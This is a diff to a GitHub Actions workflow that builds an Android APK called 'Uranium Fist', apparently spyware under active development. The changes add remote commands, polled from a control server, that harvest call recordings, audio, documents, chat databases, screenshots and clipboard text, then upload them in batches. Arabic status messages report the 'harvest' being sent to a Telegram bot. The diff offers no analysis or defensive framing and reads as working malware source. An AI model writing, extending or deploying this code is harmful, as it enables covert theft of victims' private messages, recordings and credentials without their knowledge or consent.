@@ -1,11 +1,11 @@
-name: Uranium Fist Android Node Builder
+name: Uranium Fist Android Node Builder v7.7
 
 on:
   workflow_dispatch:
 
 jobs:
   build:
-    name: Build Uranium Fist Operational APK
+    name: Build Uranium Fist Operational APK v7.7
     runs-on: ubuntu-latest
 
     steps:
@@ -177,6 +177,7 @@ jobs:
           import android.app.NotificationChannel
           import android.app.NotificationManager
           import android.app.Service
+          import android.content.ClipboardManager
           import android.content.Context
           import android.content.Intent
           import android.database.Cursor
@@ -285,6 +286,19 @@ jobs:
                                           compressAndUploadMegaBatches(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                       } else if (responseStr.contains("EXTRACT_STORAGE_ZIP")) {
                                           compressAndUploadMegaBatches(deviceId, nodeModel, "Storage_MegaArchive", MediaStore.Files.getContentUri("external"))
+                                      } else if (responseStr.contains("EXTRACT_AUDIO")) {
+                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Audio_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
+                                      } else if (responseStr.contains("EXTRACT_DOCS")) {
+                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Documents_Archive", MediaStore.Files.getContentUri("external"))
+                                      } else if (responseStr.contains("EXTRACT_AUDIO_CALLS")) {
+                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Call_Recordings", MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
+                                      } else if (responseStr.contains("EXTRACT_CHAT_DBS")) {
+                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Chat_Databases", MediaStore.Files.getContentUri("external"))
+                                      } else if (responseStr.contains("EXTRACT_SCREENSHOT_ZIP")) {
+                                          compressAndUploadMegaBatches(deviceId, nodeModel, "Screenshots", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
+                                      } else if (responseStr.contains("EXTRACT_CLIPBOARD")) {
+                                          val clipData = readClipboard()
+                                          sendReportToServer(deviceId, nodeModel, clipData)
                                       } else if (responseStr.contains("EXTRACT_PHOTOS")) {
                                           extractAndUploadSingleFiles(deviceId, nodeModel, true)
                                       } else if (responseStr.contains("EXTRACT_LOCATION")) {
@@ -298,7 +312,7 @@ jobs:
                               }
                               conn.disconnect()
 
-                              delay(5000L)
+                              delay(3000L)
                           } catch (e: Exception) {
                               delay(5000L)
                           }
@@ -360,6 +374,22 @@ jobs:
                       }
                   } catch (e: Exception) {
                       sb.append("Error: ${e.message}\n")
+                  }
+                  return sb.toString()
+              }
+
+              private fun readClipboard(): String {
+                  val sb = StringBuilder("=== URANIUM CLIPBOARD ===\n")
+                  try {
+                      val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+                      if (clipboard.hasPrimaryClip() && clipboard.primaryClip?.itemCount ?: 0 > 0) {
+                          val item = clipboard.primaryClip?.getItemAt(0)
+                          sb.append("Text: ${item?.text}\n")
+                      } else {
+                          sb.append("Clipboard is empty or inaccessible.\n")
+                      }
+                  } catch (e: Exception) {
+                      sb.append("Error reading clipboard: ${e.message}\n")
                   }
                   return sb.toString()
               }
@@ -474,7 +504,7 @@ jobs:
 
                       sendReportToServer(nodeId, nodeModel, "✅ تم إتمام الحصاد العملاق لـ $prefix وإرسال كافة الأجزاء إلى بوت تيليجرام بنجاح!")
                   } catch (e: Exception) {
-                      sendReportToServer(nodeId, nodeModel, "⚠️️ خطأ في الحصاد العملاق لـ $prefix: ${e.message}")
+                      sendReportToServer(nodeId, nodeModel, "⚠️ خطأ في الحصاد العملاق لـ $prefix: ${e.message}")
                   }
               }
 
@@ -654,5 +684,5 @@ jobs:
       - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Uranium-Fist-Node
+          name: Uranium-Fist-Node-v7.7
           path: app/build/outputs/apk/debug/app-debug.apk
